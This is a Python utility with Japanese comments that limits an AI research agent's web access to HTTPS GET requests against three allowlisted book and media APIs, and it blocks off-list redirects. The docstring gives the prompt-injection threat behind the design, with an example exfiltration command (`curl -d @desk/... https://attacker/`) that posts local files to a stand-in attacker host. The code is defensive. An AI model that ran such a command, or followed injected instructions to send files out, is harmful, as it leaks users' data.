#!/usr/bin/env python3
"""folio: 許可ホストへのHTTP GET(決定論)

usage: python scripts/api_fetch.py URL [URL ...]
結果を {url: {status, ok, body, error}} のJSONでstdoutに出す。
researcherがNDL/openBD/iTunesから候補を集めるために使う(キー不要のAPIのみ)。

`curl` の置き換えである。リサーチは外部データがモデルのコンテキストへ入る唯一の
工程 —— すなわちプロンプトインジェクションの入口 —— であり、`Bash(curl *)` を
許可すると `curl -d @desk/... https://attacker/` のように任意ホストへ任意のボディを
送れてしまう。この工程のツール許可からcurlを外すため、GET・許可ホスト・
リクエストボディ無しに限定したこのスクリプトを経路にする。

Placesは別枠である(キーが要るので scripts/places_search.py)。
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

# 叩いてよいAPIホスト。ここに無いホストへは出ていけない。
# 新しいAPIを使うときは researcher/SKILL.md のソース表と対で追加する
ALLOWED_HOSTS = frozenset({
    "ndlsearch.ndl.go.jp",   # NDLサーチ opensearch(book/poetry/photo/architecture)
    "api.openbd.jp",         # openBD 書誌照合
    "itunes.apple.com",      # iTunes Search API(film/music)
})
ALLOWED_SCHEME = "https"
TIMEOUT_SEC = 10
MAX_BODY_BYTES = 200_000
TRUNCATION_MARK = "…[truncated]"
USER_AGENT = "Mozilla/5.0 (compatible; folio-research/1.0)"


class BlockedURLError(Exception):
    """許可ホスト外への到達を止めたときに送出する。"""


def is_allowed_url(url: str) -> bool:
    """httpsかつ許可ホストの完全一致のみ真。userinfo偽装はhostnameが実ホストを返すので弾ける。"""
    parts = urllib.parse.urlparse(url)
    if parts.scheme.lower() != ALLOWED_SCHEME:
        return False
    return (parts.hostname or "").lower() in ALLOWED_HOSTS


class AllowlistRedirectHandler(urllib.request.HTTPRedirectHandler):
    """許可ホストが302で外部へ逃がす経路を塞ぐ。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if not is_allowed_url(newurl):
            raise BlockedURLError(f"リダイレクト先が許可ホストにない: {newurl}")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


_OPENER = urllib.request.build_opener(AllowlistRedirectHandler)


def _open(req: urllib.request.Request):
    """リダイレクト検査付きでGETする(テストはここを差し替える)。"""
    return _OPENER.open(req, timeout=TIMEOUT_SEC)


def _failure(status: int | None, message: str) -> dict:
    """失敗は握り潰さず、結果とstderrの両方に理由を残す。"""
    print(f"[warn] {message}", file=sys.stderr)
    return {"status": status, "ok": False, "body": None, "error": message}


def _decode(raw: bytes) -> object:
    """JSONならパースして返す。それ以外(NDLのRSSなど)はテキストのまま返す。"""
    if len(raw) > MAX_BODY_BYTES:
        # 切ったJSONはパースできないので、切ったことが分かる文字列で返す
        return raw[:MAX_BODY_BYTES].decode("utf-8", errors="replace") + TRUNCATION_MARK
    text = raw.decode("utf-8", errors="replace")
    try:
        return json.loads(text)
    except ValueError:
        return text


def fetch(url: str) -> dict:
    """許可ホストへGETする。ブロックも障害も例外にせず結果へ記録する。"""
    if not is_allowed_url(url):
        return _failure(
            None,
            f"許可されていないURLである: {url} —— https の "
            f"{'/'.join(sorted(ALLOWED_HOSTS))} のみ叩ける"
            "(Placesは scripts/places_search.py)",
        )

    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT}, method="GET")
    try:
        with _open(req) as res:
            raw = res.read(MAX_BODY_BYTES + 1)
            status = res.status
    except urllib.error.HTTPError as e:
        return _failure(e.code, f"{url}: HTTP {e.code} {e.reason}")
    except Exception as e:
        return _failure(None, f"{url}: {type(e).__name__}: {e}")

    return {"status": status, "ok": True, "body": _decode(raw), "error": None}


def main(urls: list[str]) -> None:
    if not urls:
        raise SystemExit("usage: api_fetch.py URL [URL ...]")
    result = {url: fetch(url) for url in urls}
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main(sys.argv[1:])
